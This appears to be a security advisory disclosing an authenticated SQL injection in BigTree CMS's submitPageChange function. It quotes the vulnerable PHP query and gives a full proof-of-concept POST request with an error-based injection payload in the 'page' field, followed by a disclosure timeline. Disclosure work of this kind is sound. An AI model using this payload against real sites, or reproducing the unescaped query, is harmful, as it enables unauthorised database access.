@@ -1,0 +1,181 @@
+1. ADVISORY INFORMATION
+========================================
+Title: BigTree CMS <= 4.2.11 Authenticated SQL Injection Vulnerability
+Application: BigTree CMS
+Remotely Exploitable: Yes
+Versions Affected: < 4.2.11
+Vendor URL: https://www.bigtreecms.org
+Bugs:  SQL Injection
+Author: Mehmet Ince
+Date of found: 27 Jun 2016
+
+
+2. CREDIT
+========================================
+Those vulnerabilities was identified during external penetration test
+by Mehmet INCE from PRODAFT / INVICTUS.
+
+Netsparker was used for initial detection.
+
+3. DETAILS
+========================================
+
+Following codes shows $page variable is used at inside SQL query without
+proper escaping nor PDO.
+
+File : /core/inc/bigtree/admin.php
+
+Lines 6866 - 6879
+
+function submitPageChange($page,$changes) {
+if ($page[0] == "p") {
+// It's still pending...
+$type = "NEW";
+$pending = true;
+$existing_page = array();
+$existing_pending_change = array("id" => substr($page,1));
+} else {
+// It's an existing page
+$type = "EDIT";
+$pending = false;
+$existing_page = BigTreeCMS::getPage($page);
+$existing_pending_change = sqlfetch(sqlquery("SELECT id FROM
+bigtree_pending_changes WHERE `table` = 'bigtree_pages' AND item_id =
+'$page'"));
+}
+...
+}
+
+
+Basically submitPageChange function is vulnerable against SQL Injection
+vulnerability. This function was used twice during development. Following
+list shows location of these function callers.
+
+/core/admin/modules/pages/front-end-update.php
+/core/admin/modules/pages/update.php
+
+
+PoC:
+
+Following HTTP POST request was used in order to exploit the SQL Injection
+flaw.
+
+POST /site/index.php/admin/pages/update/ HTTP/1.1
+Cache-Control: no-cache
+Referer: http://10.0.0.154/site/index.php/admin/pages/edit/2/
+Accept:
+text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/41.0.2272.16 Safari/537.36
+Accept-Language: en-us,en;q=0.5
+X-Scanner: Netsparker
+Cookie: PHPSESSID=amsscser3eg7fkljpjjt78ki17; hide_bigtree_bar=;
+bigtree_admin[email]=mehmet%40mehmetince.net;
+bigtree_admin[login]=%5B%22session-5770eca81c6d86.91986415%22%2C%22chain-5770ec71e2d7d3.28696204%22%5D;
+PHPSESSID=lsrbe949jc3na5j1sof19a3s53
+Host: 10.0.0.154
+Accept-Encoding: gzip, deflate
+Content-Length: 2248
+Content-Type: multipart/form-data; boundary=b788b047b8e345b792cdc1f81fef2106
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+2097152
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="_bigtree_post_check"
+
+success
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="page"
+
+-1' and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT
+COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x
+FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+'
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="nav_title"
+
+The Trees
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="title"
+
+The Trees
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="publish_at"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="expire_at"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="in_nav"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="redirect_lower"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="trunk"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="external"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="new_window"
+
+Yes
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="resources[page_header]"
+
+The Trees
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="tag_entry"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="route"
+
+trees
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="seo_invisible"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="ptype"
+
+Save
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="max_age"
+
+3
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="template"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="meta_keywords"
+
+
+--b788b047b8e345b792cdc1f81fef2106
+Content-Disposition: form-data; name="meta_description"
+
+
+--b788b047b8e345b792cdc1f81fef2106--
+
+
+4. TIMELINE
+========================================
+27 Jun 2016 - Netsparker identified SQL Injection.
+27 Jun 2016 - Source code review and finding root cause of SQLi.
+27 Jun 2016 - Issue resolved by PRODAFT / INVICTUS team.
+27 Jun 2016 - Pull Request has been sended.
+
+https://github.com/bigtreecms/BigTree-CMS/pull/256
+
+-- 
+Sr. Information Security Engineer
+https://www.mehmetince.net
